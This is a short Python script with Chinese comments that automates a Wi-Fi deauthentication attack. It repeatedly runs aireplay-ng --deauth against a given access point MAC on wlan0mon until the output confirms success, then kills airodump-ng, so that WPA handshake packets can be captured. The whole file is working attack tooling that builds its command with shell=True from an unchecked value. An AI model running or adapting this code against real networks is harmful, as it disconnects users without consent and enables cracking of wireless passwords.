# coding:utf-8
import os
import subprocess
import re
import time
"""
不断执行route攻击，搜集握手包
"""
filedir = os.path.dirname(os.path.realpath(__file__))


class ROUTE:

    def __init__(self, mac):
        # self.routeattack = os.path.join(filedir, 'routrattack', 'routeattack.log')
        self.logpath = "/home/execute.log"
        self.mac = mac
        self.limit = 20

    # 保存shell的所有输出
    def writeinfotolog(self):
        cmd = 'aireplay-ng --deauth 10 -a {} wlan0mon'.format(self.mac)
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        output, err = p.communicate()
        return output

    def killairodump(self):
        subprocess.call("ps -ef|grep airodump-ng|grep -v grep|cut -c 9-15|xargs kill -s 9", shell=True)

    def strat(self):
        count = 0
        re_route = re.compile(r'Sending DeAuth to broadcast \-\- BSSID\: \[{}\]'.format(self.mac))
        while True:
            # 防止主程序结束后还在自己运行
            if count > self.limit:
                break
            count += 1
            # 写入文件前删除可能存在的log
            strtext = self.writeinfotolog()
            router = re_route.findall(strtext)
            # 泛洪攻击没有成功则停0.5s继续
            if len(router) == 0:
                time.sleep(0.1)
            else:
                # 泛洪攻击成功后停止程序
                time.sleep(2)
                break
        self.killairodump()
        return